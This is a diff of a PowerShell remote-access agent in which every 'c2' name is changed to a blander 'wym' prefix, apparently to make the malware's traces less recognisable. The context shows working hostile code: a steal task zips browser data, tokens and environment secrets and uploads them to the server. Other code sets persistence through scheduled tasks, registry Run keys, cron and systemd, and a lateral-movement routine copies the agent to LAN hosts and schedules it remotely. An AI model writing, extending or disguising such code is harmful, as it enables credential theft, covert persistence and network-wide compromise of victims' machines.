@@ -15,14 +15,14 @@ Usage:
     -Jitter ... -State ... -Verbose.
 
 Environment variables (accepted when the flag is not given):
-    C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+    WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
 
 Flags:
-    --server URL      server base URL (required unless C2_SERVER is set)
-    --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+    --server URL      server base URL (required unless WYM_SERVER is set)
+    --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
     --interval N      heartbeat interval in seconds (default 10, min 1)
     --jitter N        random jitter in seconds added to the interval
-    --state FILE      state file persisting the agent id (default ~/.c2agent.json)
+    --state FILE      state file persisting the agent id (default ~/.wymagent.json)
     --verbose         print activity to stdout
     -h, --help        show this help and exit
 
@@ -42,7 +42,7 @@ try { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::S
 Add-Type -AssemblyName System.Net.Http -ErrorAction SilentlyContinue
 
 $Script:ThisScript = $MyInvocation.MyCommand.Path
-if (-not $Script:ThisScript) { $Script:ThisScript = Join-Path ([Environment]::GetFolderPath('UserProfile')) 'c2agent.ps1' }
+if (-not $Script:ThisScript) { $Script:ThisScript = Join-Path ([Environment]::GetFolderPath('UserProfile')) 'wymagent.ps1' }
 
 # ----------------------------------------------------------------------
 # Command-line parsing (accepts both --name value and -Name value, the = form,
@@ -81,12 +81,12 @@ while ($i -lt $args.Count) {
         if ($nm -eq 'help') {
             Write-Output 'usage: powershell agent.ps1 --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]'
             Write-Output ''
-            Write-Output 'Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):'
-            Write-Output '  --server URL      server base URL (required unless C2_SERVER is set)'
-            Write-Output '  --token TOKEN     shared agent token (required unless C2_TOKEN is set)'
+            Write-Output 'Flags (also settable via WYM_SERVER/WYM_TOKEN/WYM_INTERVAL/WYM_JITTER/WYM_STATE_FILE/WYM_VERBOSE):'
+            Write-Output '  --server URL      server base URL (required unless WYM_SERVER is set)'
+            Write-Output '  --token TOKEN     shared agent token (required unless WYM_TOKEN is set)'
             Write-Output '  --interval N      heartbeat interval in seconds (default 10, min 1)'
             Write-Output '  --jitter N        random jitter in seconds added to the interval'
-            Write-Output '  --state FILE      state file persisting the agent id (default ~/.c2agent.json)'
+            Write-Output '  --state FILE      state file persisting the agent id (default ~/.wymagent.json)'
             Write-Output '  --verbose         print activity to stdout'
             Write-Output '  -h, --help        show this help and exit'
             exit 0
@@ -110,28 +110,28 @@ while ($i -lt $args.Count) {
     $i++
 }
 
-if (-not $Script:ScriptServer) { $Script:ScriptServer = $env:C2_SERVER }
-if (-not $Script:ScriptToken)  { $Script:ScriptToken = $env:C2_TOKEN }
+if (-not $Script:ScriptServer) { $Script:ScriptServer = $env:WYM_SERVER }
+if (-not $Script:ScriptToken)  { $Script:ScriptToken = $env:WYM_TOKEN }
 if ($null -eq $Script:ScriptInterval) {
-    if ($env:C2_INTERVAL) {
-        try { $Script:ScriptInterval = [math]::Max(1, [int]$env:C2_INTERVAL) } catch {}
+    if ($env:WYM_INTERVAL) {
+        try { $Script:ScriptInterval = [math]::Max(1, [int]$env:WYM_INTERVAL) } catch {}
     }
     if ($null -eq $Script:ScriptInterval) { $Script:ScriptInterval = 10 }
 }
 if ($null -eq $Script:ScriptJitter) {
-    if ($env:C2_JITTER) {
-        try { $Script:ScriptJitter = [math]::Max(0.0, [double]$env:C2_JITTER) } catch {}
+    if ($env:WYM_JITTER) {
+        try { $Script:ScriptJitter = [math]::Max(0.0, [double]$env:WYM_JITTER) } catch {}
     }
     if ($null -eq $Script:ScriptJitter) { $Script:ScriptJitter = 0.0 }
 }
 if (-not $Script:ScriptState) {
-    if ($env:C2_STATE_FILE) { $Script:ScriptState = $env:C2_STATE_FILE }
-    else { $Script:ScriptState = Join-Path ([Environment]::GetFolderPath('UserProfile')) '.c2agent.json' }
+    if ($env:WYM_STATE_FILE) { $Script:ScriptState = $env:WYM_STATE_FILE }
+    else { $Script:ScriptState = Join-Path ([Environment]::GetFolderPath('UserProfile')) '.wymagent.json' }
 }
-if ($env:C2_VERBOSE -eq '1' -or $env:C2_VERBOSE -eq 'true') { $Script:ScriptVerbose = $true }
+if ($env:WYM_VERBOSE -eq '1' -or $env:WYM_VERBOSE -eq 'true') { $Script:ScriptVerbose = $true }
 
 if (-not $Script:ScriptServer -or -not $Script:ScriptToken) {
-    Write-Warning 'agent.ps1: --server and --token are required (or C2_SERVER/C2_TOKEN)'
+    Write-Warning 'agent.ps1: --server and --token are required (or WYM_SERVER/WYM_TOKEN)'
     exit 2
 }
 
@@ -513,7 +513,7 @@ function Invoke-ClipboardTask([object]$argsMap) {
 function Invoke-ScreenshotTask([string]$taskId, [object]$argsMap) {
     $name = (Get-ShortString $argsMap.name).Trim()
     if (-not $name) { $name = 'screenshot' }
-    $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ('c2shot_' + [guid]::NewGuid().ToString('N') + '.png')
+    $tmp = Join-Path ([System.IO.Path]::GetTempPath()) ('wymshot_' + [guid]::NewGuid().ToString('N') + '.png')
     try {
         $ok = $false
         if (Test-WindowsRt) {
@@ -654,7 +654,7 @@ function Steal-Browser([string]$work) {
 function Invoke-StealTask([string]$taskId, [object]$argsMap) {
     $profile = (Get-ShortString $argsMap.profile).ToLower()
     if ($profile -notin @('all', 'env', 'tokens', 'browser')) { $profile = 'all' }
-    $work = Join-Path ([System.IO.Path]::GetTempPath()) ('c2steal_' + [guid]::NewGuid().ToString('N'))
+    $work = Join-Path ([System.IO.Path]::GetTempPath()) ('wymsteal_' + [guid]::NewGuid().ToString('N'))
     New-Item -ItemType Directory -Path $work -Force | Out-Null
     $archive = $null
     $manifest = New-Object System.Collections.Generic.List[string]
@@ -676,7 +676,7 @@ function Invoke-StealTask([string]$taskId, [object]$argsMap) {
         }
         $listing = $manifest | Sort-Object | ForEach-Object { ($_.ToString()) }
         $listing | Set-Content -LiteralPath (Join-Path $work 'manifest.txt') -Encoding UTF8
-        $archive = Join-Path ([System.IO.Path]::GetTempPath()) ('c2steal_zip_' + [guid]::NewGuid().ToString('N') + '.zip')
+        $archive = Join-Path ([System.IO.Path]::GetTempPath()) ('wymsteal_zip_' + [guid]::NewGuid().ToString('N') + '.zip')
         Compress-Archive -Path (Join-Path $work '*') -DestinationPath $archive -Force
         $size = (Get-Item -LiteralPath $archive).Length
         $code = Send-FileUpload $taskId $archive 'steal.zip' 'application/zip'
@@ -803,29 +803,29 @@ function Get-RelaunchCmd([string]$scriptPath) {
 
 function Persist-Windows {
     $base = if ($env:APPDATA) { $env:APPDATA } else { [Environment]::GetFolderPath('UserProfile') }
-    $drop = Join-Path $base 'Microsoft\Windows\c2update'
+    $drop = Join-Path $base 'Microsoft\Windows\wymupdate'
     New-Item -ItemType Directory -Path $drop -Force | Out-Null
     $lines = @()
     $code = 0
     try {
-        $dest = Join-Path $drop 'c2agent.ps1'
+        $dest = Join-Path $drop 'wymagent.ps1'
         Copy-Item -LiteralPath $Script:ThisScript -Destination $dest -Force
         $relaunch = Get-RelaunchCmd $dest
         $lines += "persistence: copied self to $dest"
         $progdata = if ($env:ProgramData) { $env:ProgramData } else { 'C:\ProgramData' }
-        $launcherDir = Join-Path $progdata 'c2update'
+        $launcherDir = Join-Path $progdata 'wymupdate'
         New-Item -ItemType Directory -Path $launcherDir -Force | Out-Null
-        $wrapper = Join-Path $launcherDir 'c2relaunch.cmd'
+        $wrapper = Join-Path $launcherDir 'wymrelaunch.cmd'
         "@echo off`r`nstart `"`" /b $relaunch`r`n" | Set-Content -LiteralPath $wrapper -Encoding ASCII
         $lines += "persistence: wrote launcher $wrapper"
 
-        $r = & schtasks /Create /TN 'c2agent-persist' /TR "`"$wrapper`"" `
+        $r = & schtasks /Create /TN 'wymagent-persist' /TR "`"$wrapper`"" `
             /SC ONLOGON /RL HIGHEST /F 2>&1
         $lines += ($r -join "`n")
         $code = $LASTEXITCODE
 
         $r2 = & reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' `
-            /v c2agent /t REG_SZ /d $wrapper /f 2>&1
+            /v wymagent /t REG_SZ /d $wrapper /f 2>&1
         $lines += ($r2 -join "`n")
         $code2 = $LASTEXITCODE
         return @{ output = Transform-Output ($lines -join "`n"); exit_code = 0; error = '' }
@@ -835,18 +835,18 @@ function Persist-Windows {
 }
 
 function Persist-Unix {
-    $cfg = Join-Path ([Environment]::GetFolderPath('UserProfile')) '.config\c2update'
+    $cfg = Join-Path ([Environment]::GetFolderPath('UserProfile')) '.config\wymupdate'
     New-Item -ItemType Directory -Path $cfg -Force | Out-Null
-    $dest = Join-Path $cfg 'c2agent.ps1'
+    $dest = Join-Path $cfg 'wymagent.ps1'
     Copy-Item -LiteralPath $MyInvocation.MyCommand.Path -Destination $dest -Force
     $relaunch = Get-RelaunchCmd $dest
     $lines = @()
     $lines += "persistence: copied self to $dest"
-    $cron = '@reboot ' + $relaunch + ' # c2agent-persist'
+    $cron = '@reboot ' + $relaunch + ' # wymagent-persist'
     $blk = {
         $cron = $args[0]
         $existing = if (Get-Command crontab -ErrorAction SilentlyContinue) {
-            (crontab -l 2>$null) | Where-Object { $_ -notmatch 'c2agent-persist' }
+            (crontab -l 2>$null) | Where-Object { $_ -notmatch 'wymagent-persist' }
         } else { $null }
         $all = @($existing) + $cron
         $all | crontab - 2>&1
@@ -854,8 +854,8 @@ function Persist-Unix {
     }
     $r1 = & powershell -NoProfile -ExecutionPolicy Bypass -Command $blk $cron 2>&1
     $lines += ($r1 -join "`n")
-    $unit = Join-Path $cfg 'c2-update.service'
-    "[Unit]`nDescription=c2 update`n`n[Service]`nType=simple`nExecStart=/bin/sh -c '$relaunch'`nRestart=always`n`n[Install]`nWantedBy=default.target`n" |
+    $unit = Join-Path $cfg 'wym-update.service'
+    "[Unit]`nDescription=wym update`n`n[Service]`nType=simple`nExecStart=/bin/sh -c '$relaunch'`nRestart=always`n`n[Install]`nWantedBy=default.target`n" |
         Set-Content -LiteralPath $unit -Encoding ASCII
     $r2 = & systemctl --user daemon-reload 2>&1; & systemctl --user enable --now $unit 2>&1
     $lines += ($r2 -join "`n")
@@ -905,21 +905,21 @@ function Deploy-WindowsPeer([string]$hostIp, [string]$user, [string]$pwd) {
         & net use $share /delete /y 2>&1 | Out-Null
         return 'failed (copy: ' + (($r -join '; ').Trim()) + ')'
     }
-    $r = & schtasks /Create /S $hostIp /TN 'c2agent-lateral' /TR "`"$remote`"" `
+    $r = & schtasks /Create /S $hostIp /TN 'wymagent-lateral' /TR "`"$remote`"" `
         /SC ONLOGON /RU $user /RP $pwd /RL HIGHEST /F 2>&1
     & net use $share /delete /y 2>&1 | Out-Null
     if ($LASTEXITCODE -ne 0) {
         return 'deployed (file dropped; task: ' + (($r -join '; ').Trim()) + ')'
     }
-    return 'deployed (file dropped + scheduled c2agent-lateral)'
+    return 'deployed (file dropped + scheduled wymagent-lateral)'
 }
 
 function Invoke-LateralTask([object]$argsMap) {
     $subnet = (Get-ShortString $argsMap.subnet).Trim()
     $user = (Get-ShortString $argsMap.user).Trim()
     $pwd = (Get-ShortString $argsMap.pass).Trim()
-    if (-not $user) { $user = $env:C2_LAT_USER }
-    if (-not $pwd) { $pwd = $env:C2_LAT_PASS }
+    if (-not $user) { $user = $env:WYM_LAT_USER }
+    if (-not $pwd) { $pwd = $env:WYM_LAT_PASS }
     $peers = Get-LanPeers $subnet
     if ($peers.Count -eq 0) {
         return @{ output = 'lateral: no LAN peers found'; exit_code = 1; error = '' }
@@ -929,7 +929,7 @@ function Invoke-LateralTask([object]$argsMap) {
     $deployed = 0; $failed = 0; $skipped = 0
     foreach ($hostIp in $peers) {
         if (-not $user -or -not $pwd) {
-            $status = 'skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)'
+            $status = 'skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)'
         }
         else {
             $status = Deploy-WindowsPeer $hostIp $user $pwd
